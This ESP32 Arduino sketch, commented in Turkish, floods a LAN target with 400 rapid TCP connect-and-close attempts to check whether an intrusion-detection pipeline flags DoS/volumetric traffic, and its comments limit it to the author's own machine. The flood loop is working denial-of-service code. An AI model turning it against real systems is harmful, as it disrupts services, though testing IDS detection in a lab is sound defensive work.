// ============================================================================
//  esp32_connflood.ino  --  CICIDS SINIFI: DoS / DDoS (baglanti seli)
// ============================================================================
//  YETKI: SADECE sana ait, ayni yerel LAN'daki Windows IDS makinesine karsi,
//  kontrollu/yetkilendirilmis dogrulama testi icindir.
//
//  ONEMLI GERCEKCILIK NOTU (hping3 karsilastirmasi):
//    Pi planindaki "hping3 -S --  ham SYN-flood" ESP32 ile PRATIK DEGIL.
//    ESP32 Arduino/lwIP standart API'siyle ham SYN paketi (el sikismayi
//    tamamlamadan yarim-acik) uretmek icin LWIP_RAW/ham soket TCP'sini elle
//    yazmak gerekir -- tipik derlemede kapali ve cok agir. Bunun yerine bu
//    sketch HIZLI ARDISIK TCP connect()+hemen kapat dongusu yapar. Bu bir
//    "baglanti seli" (connection flood); ham SYN-flood degildir AMA:
//      * Her connect() ilk pakette bir SYN-only (SYN=1,ACK=0) gonderir ->
//        pipeline'in is_flood sayaci (SYN_ABS_MIN=150) bunlari sayar.
//      * Her connect() YENI bir efemeral kaynak-port kullanir -> is_conn_flood
//        sayaci (CONN_FLOOD_MIN=200 farkli baglanti) tetiklenir.
//    Ikisi de VOLUMETRIK dala goturur; denetim (F3) bu dalda konsey vetosu
//    YOK, OOD salt-gozlem oldugunu dogruladi -> GERCEK saldiri asla yanlislikla
//    bastirilamaz, NET alarm beklenir. (CICIDS DoS-Hulk/GoldenEye de tam-
//    baglanti kurar; bu davranis onlara SYN-flood'dan daha yakindir.)
//
//  HIZ SINIRI: TOPLAM_CONNECT kadar deneme, aralarinda DELAY_MS bekleme.
//  SONSUZ/max-hiz DEGIL -- deneme bitince durur (Pi'deki "--flood YOK" ilkesi).
//
//  ARDUINO IDE: Board = "ESP32 Dev Module". Ek kutuphane gerekmez. 115200.
// ============================================================================

#include <WiFi.h>
#include "secrets.h"   // local, not in git: copy secrets.example.h

// ----- DUZENLENEBILIR DEGISKENLER -------------------------------------------
const char* WIFI_SSID = SECRET_WIFI_SSID;   // set in secrets.h
const char* WIFI_PASS = SECRET_WIFI_PASS;   // set in secrets.h
IPAddress   TARGET_IP(SECRET_TARGET_IP);    // set in secrets.h (IDS machine LAN IP)

const uint16_t TARGET_PORT   = 8080;       // hedef port (01_windows_setup.ps1'de acilan http.server)
const uint32_t TOTAL_CONNECT = 400;        // toplam baglanti denemesi (>=200 -> conn_flood, >=150 -> is_flood)
const int      CONNECT_TIMEOUT_MS = 200;   // her baglanti icin zaman asimi
const int      DELAY_MS      = 8;          // baglantilar arasi bekleme (ms) -- hiz siniri (0 yapma)
// ----------------------------------------------------------------------------

void connectWiFi() {
  Serial.printf("[WiFi] '%s' agina baglaniliyor", WIFI_SSID);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) { delay(400); Serial.print("."); }
  Serial.printf("\n[WiFi] Baglandi. ESP32 IP = %s\n", WiFi.localIP().toString().c_str());
  Serial.println("[i] Bu IP'yi 04_mongo_analysis.py --attacker-ip degerine yaz.");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n============================================================");
  Serial.println(" ESP32 CANLI-ATES -- CICIDS DoS/DDoS (baglanti seli)");
  Serial.println("============================================================");
  Serial.printf(" HEDEF        : %s:%u\n", TARGET_IP.toString().c_str(), TARGET_PORT);
  Serial.printf(" DENEME SAYISI: %u  (hiz siniri: her denemede %d ms bekleme)\n",
                (unsigned)TOTAL_CONNECT, DELAY_MS);
  Serial.println(" NOT          : ham SYN-flood DEGIL, connect+kapat seli (bkz. dosya basi).");
  Serial.println(" YETKI        : yalnizca sana ait hedef, yetkili lab testi.");
  Serial.println("------------------------------------------------------------");

  connectWiFi();

  Serial.println("\n[>>>] Baglanti seli basliyor...\n");
  uint32_t established = 0;

  for (uint32_t i = 0; i < TOTAL_CONNECT; i++) {
    WiFiClient client;
    bool ok = client.connect(TARGET_IP, TARGET_PORT, CONNECT_TIMEOUT_MS);
    if (ok) {
      established++;
      // Hemen kapat: her dongude yeni efemeral kaynak-port -> conn_flood sayaci.
      client.stop();
    }
    if (i % 50 == 0 && i > 0) {
      Serial.printf("  ... %u/%u deneme (kurulan: %u)\n",
                    (unsigned)i, (unsigned)TOTAL_CONNECT, (unsigned)established);
    }
    delay(DELAY_MS);
  }

  Serial.println("\n============================================================");
  Serial.printf(" SEL BITTI. Denenen: %u  Kurulan: %u.\n",
                (unsigned)TOTAL_CONNECT, (unsigned)established);
  Serial.println(" Beklenti (Mongo): is_volumetric=True, is_flood veya is_conn_flood=True,");
  Serial.println("  status=ATTACK. suppressed_by BOS olmali (volumetrik dalda veto yok).");
  Serial.println("============================================================");
}

void loop() {
  delay(10000);  // tek seferlik; tekrar icin RESET.
}
